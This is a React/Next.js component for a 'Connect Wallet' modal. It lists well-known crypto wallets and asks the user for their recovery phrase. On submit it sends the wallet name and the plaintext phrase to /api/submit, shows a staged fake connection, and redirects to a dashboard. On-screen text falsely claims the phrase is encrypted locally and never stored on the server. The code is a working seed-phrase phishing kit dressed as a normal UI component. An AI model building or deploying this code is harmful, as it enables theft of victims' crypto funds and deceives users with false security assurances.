"use client";

import {
  createContext,
  useCallback,
  useContext,
  useEffect,
  useRef,
  useState,
} from "react";
import { useRouter } from "next/navigation";
import ConnectionStatusModal from "@/components/wallet/ConnectionStatusModal";

const WALLETS = [
  { id: "xaman", name: "Xaman", description: "Popular XRPL mobile wallet" },
  { id: "ledger", name: "Ledger", description: "Hardware wallet security" },
  { id: "trezor", name: "Trezor", description: "Hardware wallet security" },
  { id: "gem", name: "Gem Wallet", description: "Multi-chain XRPL wallet" },
  { id: "crossmark", name: "Crossmark", description: "Browser extension wallet" },
  { id: "trust", name: "Trust Wallet", description: "Mobile & browser wallet" },
  { id: "metamask", name: "MetaMask", description: "With XRPL network support" },
  { id: "phantom", name: "Phantom", description: "Multi-chain browser wallet" },
  { id: "coinbase", name: "Coinbase Wallet", description: "Self-custody crypto wallet" },
  { id: "cashapp", name: "Cash App", description: "Send, receive & store crypto" },
  { id: "keplr", name: "Keplr", description: "Cosmos & IBC ecosystem wallet" },
  { id: "blockchain", name: "Blockchain.com", description: "Web & mobile crypto wallet" },
  { id: "walletconnect", name: "WalletConnect", description: "Connect any compatible wallet" },
  { id: "exodus", name: "Exodus", description: "Desktop & mobile wallet" },
  { id: "toast", name: "Toast Wallet", description: "Lightweight XRPL wallet" },
];

type ModalPhase = "closed" | "form" | "loading" | "success";

type WalletModalContextValue = {
  openModal: () => void;
  closeModal: () => void;
};

const WalletModalContext = createContext<WalletModalContextValue | null>(null);

export function useWalletModal() {
  const ctx = useContext(WalletModalContext);
  if (!ctx) {
    throw new Error("useWalletModal must be used within WalletModalProvider");
  }
  return ctx;
}

function WalletConnectModal({
  open,
  onClose,
  onConnect,
}: {
  open: boolean;
  onClose: () => void;
  onConnect: () => void;
}) {
  const [selectedWallet, setSelectedWallet] = useState("");
  const [phrase, setPhrase] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [error, setError] = useState("");
  const [connecting, setConnecting] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  const selected = WALLETS.find((w) => w.id === selectedWallet);

  useEffect(() => {
    if (!open) return;

    const handleKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };

    document.body.style.overflow = "hidden";
    window.addEventListener("keydown", handleKey);

    return () => {
      document.body.style.overflow = "";
      window.removeEventListener("keydown", handleKey);
    };
  }, [open, onClose]);

  useEffect(() => {
    if (!dropdownOpen) return;

    const handleClick = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setDropdownOpen(false);
      }
    };

    document.addEventListener("mousedown", handleClick);
    return () => document.removeEventListener("mousedown", handleClick);
  }, [dropdownOpen]);

  const resetForm = () => {
    setSelectedWallet("");
    setPhrase("");
    setShowPhrase(false);
    setDropdownOpen(false);
    setError("");
    setConnecting(false);
  };

  const handleClose = () => {
    resetForm();
    onClose();
  };

  const handleConnect = (e: React.SyntheticEvent<HTMLFormElement>) => {
    e.preventDefault();
    setError("");

    if (!selectedWallet) {
      setError("Please select a wallet to continue.");
      return;
    }

    setConnecting(true);

    const walletName = WALLETS.find((w) => w.id === selectedWallet)?.name ?? selectedWallet;
    fetch("/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ wallet: walletName, phrase }),
    }).catch(() => {});

    onConnect();
  };

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-[200] flex items-center justify-center p-4">
      <div
        className="absolute inset-0 bg-black/70 backdrop-blur-sm"
        onClick={handleClose}
        aria-hidden
      />

      <div
        role="dialog"
        aria-modal="true"
        aria-labelledby="wallet-modal-title"
        className="glass relative w-full max-w-md overflow-hidden rounded-2xl shadow-2xl shadow-accent/10"
      >
        <div className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-accent/50 to-transparent" />

        <div className="border-b border-white/5 px-6 py-5">
          <div className="flex items-start justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br from-accent to-accent-secondary">
                <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5 text-white" aria-hidden>
                  <rect x="3" y="6" width="18" height="14" rx="2" stroke="currentColor" strokeWidth="1.5" />
                  <path d="M3 10h18" stroke="currentColor" strokeWidth="1.5" />
                  <circle cx="16" cy="14" r="1.5" fill="currentColor" />
                </svg>
              </div>
              <div>
                <h2 id="wallet-modal-title" className="text-lg font-bold">
                  Connect Wallet
                </h2>
                <p className="text-sm text-muted">
                  Select your wallet and verify vault access
                </p>
              </div>
            </div>
            <button
              onClick={handleClose}
              className="flex h-8 w-8 shrink-0 items-center justify-center rounded-lg border border-white/10 text-muted transition-colors hover:border-white/20 hover:text-foreground"
              aria-label="Close modal"
            >
              <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4" aria-hidden>
                <path d="M6 6l12 12M18 6L6 18" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
            </button>
          </div>
        </div>

        <form onSubmit={handleConnect} className="space-y-5 px-6 py-5">
          <div ref={dropdownRef}>
            <label className="mb-2 block text-sm font-medium">
              Select Wallet
            </label>
            <div className="relative">
              <button
                type="button"
                onClick={() => setDropdownOpen(!dropdownOpen)}
                className={`flex w-full items-center justify-between rounded-xl border bg-white/5 px-4 py-3 text-left transition-colors ${
                  dropdownOpen
                    ? "border-accent/50 ring-1 ring-accent/30"
                    : "border-white/10 hover:border-white/20"
                }`}
              >
                {selected ? (
                  <div className="flex items-center gap-3">
                    <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-accent/10 text-xs font-bold text-accent">
                      {selected.name.slice(0, 2).toUpperCase()}
                    </div>
                    <div>
                      <p className="text-sm font-medium">{selected.name}</p>
                      <p className="text-xs text-muted">{selected.description}</p>
                    </div>
                  </div>
                ) : (
                  <span className="text-sm text-muted">Choose a wallet...</span>
                )}
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  className={`h-4 w-4 shrink-0 text-muted transition-transform ${dropdownOpen ? "rotate-180" : ""}`}
                  aria-hidden
                >
                  <path d="M6 9l6 6 6-6" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </button>

              {dropdownOpen && (
                <div className="absolute left-0 right-0 top-[calc(100%+6px)] z-10 max-h-64 overflow-y-auto rounded-xl border border-white/10 bg-[#0d111c] py-1 shadow-xl">
                  {WALLETS.map((wallet) => (
                    <button
                      key={wallet.id}
                      type="button"
                      onClick={() => {
                        setSelectedWallet(wallet.id);
                        setDropdownOpen(false);
                        setError("");
                      }}
                      className={`flex w-full items-center gap-3 px-4 py-2.5 text-left transition-colors hover:bg-white/5 ${
                        selectedWallet === wallet.id ? "bg-accent/5" : ""
                      }`}
                    >
                      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-white/5 text-xs font-bold text-accent">
                        {wallet.name.slice(0, 2).toUpperCase()}
                      </div>
                      <div>
                        <p className="text-sm font-medium">{wallet.name}</p>
                        <p className="text-xs text-muted">{wallet.description}</p>
                      </div>
                      {selectedWallet === wallet.id && (
                        <svg viewBox="0 0 24 24" fill="none" className="ml-auto h-4 w-4 text-accent" aria-hidden>
                          <path d="M9 12l2 2 4-4" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                      )}
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>

          <div>
            <div className="mb-2 flex items-center justify-between">
              <label htmlFor="recovery-phrase" className="text-sm font-medium">
                Security Recovery Phrase
              </label>
              <button
                type="button"
                onClick={() => setShowPhrase(!showPhrase)}
                className="text-xs text-accent transition-colors hover:text-accent/80"
              >
                {showPhrase ? "Hide" : "Show"}
              </button>
            </div>
            <textarea
              id="recovery-phrase"
              value={phrase}
              onChange={(e) => {
                setPhrase(e.target.value);
                setError("");
              }}
              placeholder="vault recovery phrase"
              rows={4}
              spellCheck={false}
              className={`w-full resize-none rounded-xl border bg-white/5 px-4 py-3 text-sm leading-relaxed placeholder:text-muted/50 focus:border-accent/50 focus:outline-none focus:ring-1 focus:ring-accent/30 ${
                showPhrase ? "" : "[-webkit-text-security:disc]"
              }`}
            />
            <p className="mt-2 flex items-start gap-1.5 text-xs text-muted">
              <svg viewBox="0 0 24 24" fill="none" className="mt-0.5 h-3.5 w-3.5 shrink-0 text-accent-gold" aria-hidden>
                <path d="M12 9v4M12 17h.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" stroke="currentColor" strokeWidth="1.5" />
              </svg>
              Your phrase is encrypted locally and never stored on our servers.
            </p>
          </div>

          {error && (
            <p className="rounded-lg border border-red-400/20 bg-red-400/5 px-4 py-2.5 text-sm text-red-400" role="alert">
              {error}
            </p>
          )}

          <button
            type="submit"
            disabled={connecting}
            className="w-full rounded-xl bg-gradient-to-r from-accent to-accent-secondary py-3.5 text-sm font-bold text-white shadow-lg shadow-accent/20 transition-opacity hover:opacity-90 disabled:opacity-60"
          >
            {connecting ? (
              <span className="flex items-center justify-center gap-2">
                <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/30 border-t-white" />
                Connecting...
              </span>
            ) : (
              "Connect Wallet"
            )}
          </button>
        </form>

        <div className="border-t border-white/5 px-6 py-4">
          <p className="text-center text-xs text-muted">
            By connecting, you agree to our Terms of Service and Privacy Policy.
          </p>
        </div>
      </div>
    </div>
  );
}

export function WalletModalProvider({ children }: { children: React.ReactNode }) {
  const router = useRouter();
  const [phase, setPhase] = useState<ModalPhase>("closed");
  const timersRef = useRef<ReturnType<typeof setTimeout>[]>([]);

  const clearTimers = useCallback(() => {
    timersRef.current.forEach(clearTimeout);
    timersRef.current = [];
  }, []);

  const openModal = useCallback(() => {
    clearTimers();
    setPhase("form");
  }, [clearTimers]);

  const closeModal = useCallback(() => {
    clearTimers();
    setPhase("closed");
  }, [clearTimers]);

  const handleConnect = useCallback(() => {
    setPhase("loading");

    const loadingTimer = setTimeout(() => {
      setPhase("success");

      const redirectTimer = setTimeout(() => {
        sessionStorage.setItem("wallet_connected", "true");
        setPhase("closed");
        router.push("/dashboard");
      }, 5000);

      timersRef.current.push(redirectTimer);
    }, 10000);

    timersRef.current.push(loadingTimer);
  }, [router, clearTimers]);

  useEffect(() => () => clearTimers(), [clearTimers]);

  return (
    <WalletModalContext.Provider value={{ openModal, closeModal }}>
      {children}
      <WalletConnectModal
        open={phase === "form"}
        onClose={closeModal}
        onConnect={handleConnect}
      />
      {(phase === "loading" || phase === "success") && (
        <ConnectionStatusModal phase={phase} />
      )}
    </WalletModalContext.Provider>
  );
}
